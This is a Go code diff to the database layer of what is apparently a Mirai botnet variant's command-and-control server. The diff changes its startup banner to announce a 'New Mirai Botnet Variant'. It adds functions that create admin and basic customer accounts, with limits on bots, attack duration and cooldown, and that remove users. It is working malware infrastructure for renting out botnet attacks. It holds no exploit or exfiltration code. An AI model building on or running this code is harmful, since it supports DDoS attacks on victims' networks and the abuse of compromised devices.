@@ -5,7 +5,7 @@ import (
     "fmt"
     "net"
     "encoding/binary"
-	"time"
+    "time"
     _ "github.com/go-sql-driver/mysql"
     "errors"
 )
@@ -25,11 +25,12 @@ func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string)
     if err != nil {
         fmt.Println(err)
     }
-    fmt.Println("\033[38;5;22mGu\033[38;5;1mc\033[38;5;22mci\033[1;34m[\033[1;31mRemastered\033[1;34m]")
+    fmt.Println("\x1b[37m[ \x1b[1;34mNew Mirai Botnet Variant has been Started \x1b[37m]")
+     
     return &Database{db}
 }
 
-func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
+func (this *Database) TryLogin(username string, password string, ip net.Addr) (bool, AccountInfo) {
     rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
     if err != nil {
         fmt.Println(err)
@@ -44,7 +45,7 @@ func (this *Database) TryLogin(username string, password string) (bool, AccountI
     return true, accInfo
 }
 
-func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
+func (this *Database) CreateBasic(username string, password string, max_bots int, duration int, cooldown int) bool {
     rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
     if err != nil {
         fmt.Println(err)
@@ -54,6 +55,32 @@ func (this *Database) CreateUser(username string, password string, max_bots int,
         return false
     }
     this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
+    return true
+}
+
+func (this *Database) CreateAdmin(username string, password string, max_bots int, duration int, cooldown int) bool {
+    rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
+    if err != nil {
+        fmt.Println(err)
+        return false
+    }
+    if rows.Next() {
+        return false
+    }
+    this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 1, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
+    return true
+}
+
+func (this *Database) RemoveUser(username string) (bool) {
+    rows, err := this.db.Query("DELETE FROM `users` WHERE username = ?", username)
+    if err != nil {
+        fmt.Println(err)
+        return false
+    }
+    if rows.Next() {
+        return false
+    }
+    this.db.Exec("DELETE FROM `users` WHERE username = ?", username)
     return true
 }
 
